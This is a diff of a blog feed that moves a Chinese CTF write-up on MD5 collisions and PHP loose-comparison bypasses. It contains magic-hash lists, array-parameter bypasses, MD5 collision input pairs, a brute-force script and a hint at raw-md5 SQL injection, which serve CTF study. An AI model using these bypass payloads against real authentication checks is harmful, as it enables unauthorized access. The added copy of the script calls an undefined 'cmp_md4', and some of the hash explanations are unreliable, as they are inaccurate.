+                 <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>cpus<span class="token punctuation">)</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> p <span class="token keyword">in</span> processes<span class="token punctuation">:</span>
+        p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> p <span class="token keyword">in</span> processes<span class="token punctuation">:</span>
+        p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/2/2-6.png"><br>测试一下，可行<br><img src="/images/2/2-7.png"><br><a name="GT9CN"></a></p>
+<h4 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">法一：
+hash2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>hash3<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span>
+法二：
+<span class="token assign-left variable">hash2</span><span class="token operator">=</span>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<span class="token operator">&amp;</span><span class="token assign-left variable">hash3</span><span class="token operator">=</span>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><a name="Gvn9O"></a></p>
+<h4 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h4><p><img src="/images/2/2-8.png"><br>结果：<br><img src="/images/2/2-9.png"><br>只要构造 <code>xx &#39;or xxxx</code> 的形式就可以了<br>具体可以看<a href="https://blog.csdn.net/March97/article/details/81222922">这篇文章</a></p>
+<p><a name="QMEO5"></a></p>
+<h3 id="3-构造特定字符串"><a href="#3-构造特定字符串" class="headerlink" title="3.构造特定字符串"></a>3.构造特定字符串</h3><p>这个是我觉得以后为了避免大家都用现有的收集字符串解题而出的，比如：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token number">123</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"nonono"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>要构造一个开头是123且后面是字母的字符串：<br>脚本：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> multiprocessing
+<span class="token keyword">import</span> hashlib
+<span class="token keyword">import</span> random
+<span class="token keyword">import</span> string
+<span class="token keyword">import</span> sys
+
+CHARS <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
+
+
+<span class="token keyword">def</span> <span class="token function">cmp_md5</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> CHARS
+    <span class="token keyword">while</span> <span class="token keyword">not</span> stop_event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        rnds <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>CHARS<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>rnds<span class="token punctuation">)</span>
+        value <span class="token operator">=</span> md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> value<span class="token punctuation">[</span>start<span class="token punctuation">:</span> start <span class="token operator">+</span> str_len<span class="token punctuation">]</span> <span class="token operator">==</span> substr<span class="token punctuation">:</span>
+            <span class="token keyword">print</span> rnds
+            <span class="token keyword">print</span> value
+            stop_event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+            
+            
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    substr <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    start_pos <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span>
+    str_len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>substr<span class="token punctuation">)</span>
+    cpus <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>cpu_count<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    stop_event <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    processes <span class="token operator">=</span> <span class="token punctuation">[</span>multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>cmp_md4<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span>
+                                                               stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start_pos<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                 <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>cpus<span class="token punctuation">)</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> p <span class="token keyword">in</span> processes<span class="token punctuation">:</span>
+        p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> p <span class="token keyword">in</span> processes<span class="token punctuation">:</span>
+        p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>终端输入<code>python .\MD5碰撞.py &quot;123&quot; 0</code><br><img src="/images/2/2-10.png"><br>实践试一下：<br><img src="/images/2/2-11.png"><br><code>注意点：跑出来的123后面第一个字符要是字母，如果不是多跑几次，概率还是挺大的。</code></p>
+<p><a name="D6C2L"></a></p>
+<h3 id="尾言"><a href="#尾言" class="headerlink" title="尾言"></a>尾言</h3><p>还有关于双md5的题目等等，只要掌握了这些思想，看到题目就能想到解法了。这个脚本也是面向百度编程找到的，有一个脚本能跑是比较好的，可以应对各种新情况。使用python脚本是因为有多线程模式，速度更快。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
       </categories>
   </entry>
   <entry>
@@ -1162,320 +1476,6 @@ Exception in thread "main" javax.naming.NamingException: No set method found for
 ]]></content>
       <categories>
         <category>Java</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>MD5碰撞</title>
-    <url>/2022/08/23/MD5%E7%A2%B0%E6%92%9E/</url>
-    <content><![CDATA[<p><a name="lCJgX"></a></p>
-<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>在CTF中可以说是经常碰到md5加密了，一般都是进行<code>强比较</code>抑或是<code>弱比较</code>，考法非常多，但是万变不离其中。只要我们掌握了原理，一切问题便迎刃而解了。<br><a name="NGMi1"></a></p>
-<span id="more"></span>
-
-<h2 id="简单了解MD5："><a href="#简单了解MD5：" class="headerlink" title="简单了解MD5："></a>简单了解MD5：</h2><ul>
-<li>md5是一种加密算法，并且<code>不能防止碰撞破解</code>。</li>
-<li>md5加密是不可逆的，这就意味着有<code>两串不同的字符串``加密出来的内容却是相同的</code></li>
-<li>加密过程简单，碰撞还原字符难</li>
-</ul>
-<p><a name="rvOcf"></a></p>
-<h2 id="PHP的弱比较："><a href="#PHP的弱比较：" class="headerlink" title="PHP的弱比较："></a>PHP的弱比较：</h2><p>先提两个例子：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">var_dump<span class="token punctuation">(</span><span class="token string">"123a"</span><span class="token operator">==</span><span class="token number">123</span><span class="token punctuation">)</span>
-var_dump<span class="token punctuation">(</span><span class="token string">"123a"</span><span class="token operator">==</span><span class="token string">"123"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><strong><font color='#ff9900'>不看答案想一下结果会是什么</font></strong></p>
-<p>在没有认真总结前，完全不知道弱比较还要区分<code>与**字符串**类型比较</code>还是<code>与int类型比较</code><br>上述实例的结果是：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">True
-False<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><a name="C4062"></a></p>
-<h3 id="字符串与int类型比较"><a href="#字符串与int类型比较" class="headerlink" title="字符串与int类型比较:"></a>字符串与int类型比较:</h3><p>PHP规定当进行<code>字符串与数字的弱比较时</code>，会<code>进行如下步骤</code>：<br>先看字符串开头是否为数字，如果为数字，则截止到连续数字的最后一个数字，即<code>&quot;123abc456&quot;</code>&#x3D;&gt;<code>123</code><br>如果开头不为数字，则判断为false，即0。因此<br><code>(&quot;aaa123&quot;==0)</code> &#x3D;&gt;<code>true</code><br><code>(&quot;123a&quot;==123)</code> &#x3D;&gt;<code>true</code><br><strong>思维导图：</strong><br><img src="/images/2/2-1.png" alt="1"><br><a name="ILEFW"></a></p>
-<h3 id="字符串与字符串比较："><a href="#字符串与字符串比较：" class="headerlink" title="字符串与字符串比较："></a>字符串与字符串比较：</h3><p>正如上面所言：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">var_dump<span class="token punctuation">(</span><span class="token string">"123a"</span><span class="token operator">==</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //False<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>因为这个是字符串之间进行比较，想要绕过这个弱比较只能用<code>0e</code>的方式。<br>在PHP中”0e”判断为科学计数法，<code>0e123就是0的10123次方</code><br>不难推出：<code>0e123456789==0e1</code> &#x2F;&#x2F; 因为0的任意次方都为0<br>不过有一个注意点：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"0e123456"</span><span class="token operator">==</span><span class="token string">"0e345"</span>  //True
-<span class="token string">"0e12adfc"</span><span class="token operator">==</span><span class="token string">"0e345"</span>  //False
-
-在0e后面不能含有字母！！！
-在0e后面不能含有字母！！！
-在0e后面不能含有字母！！<span class="token operator">!</span>
-否则判断为False<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>#实例</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
-if<span class="token punctuation">(</span><span class="token string">"0e23253"</span><span class="token operator">==</span><span class="token string">"0e2345"</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-    <span class="token builtin class-name">echo</span> <span class="token string">'yes'</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>输出：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">yes</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><a name="eQQch"></a></p>
-<h2 id="CTF的MD5弱比较"><a href="#CTF的MD5弱比较" class="headerlink" title="CTF的MD5弱比较"></a>CTF的MD5弱比较</h2><p>在CTF中，会遇到如下的MD5弱比较题目<br><a name="XWV4b"></a></p>
-<h3 id="1-md5-a-x3D-x3D-md5-b-amp-a-x3D-b"><a href="#1-md5-a-x3D-x3D-md5-b-amp-a-x3D-b" class="headerlink" title="1.md5($a)&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b"></a>1.md5($a)&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
-<span class="token variable">$md5_1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$md5_2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5_1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5_2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token variable">$md5_1</span> <span class="token operator">!=</span> <span class="token variable">$md5_2</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">else</span>
-<span class="token punctuation">&#123;</span>
-    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"try harder"</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>这个时候就要利用<code>0e</code>的形式来解题，找到两个不同字符，md5加密后却都是0e324234的形式。如何寻找这样的字符串？<br>1.脚本寻找</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># -*- coding: utf-8 -*-</span>
-import multiprocessing
-import hashlib
-import random
-import <span class="token keyword type-declaration">string</span>
-import sys
-
-<span class="token constant">CHARS</span> <span class="token operator">=</span> <span class="token keyword type-declaration">string</span><span class="token operator">.</span>ascii_letters <span class="token operator">+</span> <span class="token keyword type-declaration">string</span><span class="token operator">.</span>digits
-
-
-def <span class="token function">cmp_md5</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">global</span> <span class="token constant">CHARS</span>
-    <span class="token keyword">while</span> not stop_event<span class="token operator">.</span><span class="token function">is_set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token class-name return-type">rnds</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token operator">.</span><span class="token function">join</span><span class="token punctuation">(</span>random<span class="token operator">.</span><span class="token function">choice</span><span class="token punctuation">(</span><span class="token constant">CHARS</span><span class="token punctuation">)</span> <span class="token keyword">for</span> <span class="token constant">_</span> in <span class="token function">range</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
-        md5 <span class="token operator">=</span> hashlib<span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span>rnds<span class="token punctuation">)</span>
-        value <span class="token operator">=</span> md5<span class="token operator">.</span><span class="token function">hexdigest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-        <span class="token keyword">if</span> value<span class="token punctuation">[</span>start<span class="token punctuation">:</span> start <span class="token operator">+</span> str_len<span class="token punctuation">]</span> <span class="token operator">==</span> substr<span class="token punctuation">:</span>
-            <span class="token comment"># print rnds</span>
-            <span class="token comment"># stop_event.set()</span>
-
-            <span class="token comment"># 碰撞双md5</span>
-            md5 <span class="token operator">=</span> hashlib<span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>
-            <span class="token keyword">if</span> md5<span class="token operator">.</span><span class="token function">hexdigest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>start<span class="token punctuation">:</span> start <span class="token operator">+</span> str_len<span class="token punctuation">]</span> <span class="token operator">==</span> substr<span class="token punctuation">:</span>
-                <span class="token keyword">print</span> rnds <span class="token operator">+</span> <span class="token string double-quoted-string">"=>"</span> <span class="token operator">+</span> value <span class="token operator">+</span> <span class="token string double-quoted-string">"=>"</span> <span class="token operator">+</span> md5<span class="token operator">.</span><span class="token function">hexdigest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string double-quoted-string">"\n"</span>
-                stop_event<span class="token operator">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-
-
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string single-quoted-string">'__main__'</span><span class="token punctuation">:</span>
-    substr <span class="token operator">=</span> sys<span class="token operator">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token function">strip</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-    start_pos <span class="token operator">=</span> <span class="token keyword type-declaration">int</span><span class="token punctuation">(</span>sys<span class="token operator">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>sys<span class="token operator">.</span>argv<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span>
-    str_len <span class="token operator">=</span> <span class="token function">len</span><span class="token punctuation">(</span>substr<span class="token punctuation">)</span>
-    cpus <span class="token operator">=</span> multiprocessing<span class="token operator">.</span><span class="token function">cpu_count</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-    stop_event <span class="token operator">=</span> multiprocessing<span class="token operator">.</span><span class="token function">Event</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-    processes <span class="token operator">=</span> <span class="token punctuation">[</span>multiprocessing<span class="token operator">.</span><span class="token function">Process</span><span class="token punctuation">(</span>target<span class="token operator">=</span>cmp_md5<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span>
-                                                               stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start_pos<span class="token punctuation">)</span><span class="token punctuation">)</span>
-                 <span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span>cpus<span class="token punctuation">)</span><span class="token punctuation">]</span>
-    <span class="token keyword">for</span> p in processes<span class="token punctuation">:</span>
-        p<span class="token operator">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">for</span> p in processes<span class="token punctuation">:</span>
-        p<span class="token operator">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>用法：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">输入命令
-python md5.py <span class="token string">"0e"</span> <span class="token number">0</span>
-<span class="token string">"0e"</span> <span class="token operator">=</span><span class="token operator">></span>要跑的字符
- <span class="token number">0</span>   <span class="token operator">=</span><span class="token operator">></span>要跑的字符的起始位置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/2/2-2.png"><br>脚本寻找要浪费大概十分钟左右的时间才能找出一个，可以用网上现成的，如果题目要求比较特殊的话，再利用自己的脚本跑<br>2.百度</p>
-<table>
-<thead>
-<tr>
-<th>MMHUWUV	    0e701732711630150438129209816536</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>MAUXXQC   	0e478478466848439040434801845361</td>
-</tr>
-<tr>
-<td>IHKFRNS	    0e256160682445802696926137988570</td>
-</tr>
-<tr>
-<td>GZECLQZ	    0e537612333747236407713628225676</td>
-</tr>
-<tr>
-<td>GGHMVOE	    0e362766013028313274586933780773</td>
-</tr>
-<tr>
-<td>GEGHBXL	    0e248776895502908863709684713578</td>
-</tr>
-<tr>
-<td>EEIZDOI	    0e782601363539291779881938479162</td>
-</tr>
-<tr>
-<td>DYAXWCA	    0e424759758842488633464374063001</td>
-</tr>
-</tbody></table>
-<p><img src="/images/2/2-3.png"><br>这样子就出flag了<br><a name="ArvDI"></a></p>
-<h3 id="2-a-x3D-x3D-md5-a"><a href="#2-a-x3D-x3D-md5-a" class="headerlink" title="2.$a&#x3D;&#x3D;md5($a)"></a>2.$a&#x3D;&#x3D;md5($a)</h3><p>这一类题型要求满足$a是0e开头，且加密后也是0e开头<br>在网上收集了这些结果：</p>
-<table>
-<thead>
-<tr>
-<th>0e215962017	0e291242476940776845150308577824</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>0e1284838308	   0e708279691820928818722257405159</td>
-</tr>
-<tr>
-<td>0e1137126905	   0e291659922323405260514745084877</td>
-</tr>
-<tr>
-<td>0e807097110	   0e318093639164485566453180786895</td>
-</tr>
-<tr>
-<td>0e730083352      0e870635875304277170259950255928</td>
-</tr>
-</tbody></table>
-<p>弱比较主要就是以上两种类型。<br><a name="UILG2"></a></p>
-<h2 id="CTF的MD5强比较"><a href="#CTF的MD5强比较" class="headerlink" title="CTF的MD5强比较"></a>CTF的MD5强比较</h2><p><a name="X5Dcp"></a></p>
-<h3 id="1-md5-a-x3D-x3D-x3D-md5-b-amp-a-x3D-b"><a href="#1-md5-a-x3D-x3D-x3D-md5-b-amp-a-x3D-b" class="headerlink" title="1.md5($a)&#x3D;&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b"></a>1.md5($a)&#x3D;&#x3D;&#x3D;md5($b) &amp; $a !&#x3D; $b</h3><p><a name="Ajb8Q"></a></p>
-<h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>数组绕过</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
-<span class="token variable">$md5_1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$md5_2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5_1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5_2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token variable">$md5_1</span> <span class="token operator">!=</span> <span class="token variable">$md5_2</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">else</span>
-<span class="token punctuation">&#123;</span>
-    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"try harder"</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><code>md5_1[]=1&amp;md5_2[]=2</code><br>因为PHP对无法md5加密的东西不加密，结果为NULL，虽然会报错，但是null&#x3D;null，逻辑关系为True。所以可以输出flag<br><img src="/images/2/2-4.png"><br><a name="q6lP9"></a></p>
-<h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>两串不一样的字符，加密结果却相同：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$a</span><span class="token operator">=</span>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
-<span class="token variable">$b</span><span class="token operator">=</span>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/images/2/2-5.png"><br>这个我的脚本就跑不出来了，是网上收集的。<br><a name="r2uDz"></a></p>
-<h2 id="题目实战："><a href="#题目实战：" class="headerlink" title="题目实战："></a>题目实战：</h2><p><a name="lz95C"></a></p>
-<h3 id="1-BJDCTF2020-Easy-MD5"><a href="#1-BJDCTF2020-Easy-MD5" class="headerlink" title="1.[BJDCTF2020]Easy MD5"></a>1.[BJDCTF2020]Easy MD5</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
-
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>这题也是两个解法：</p>
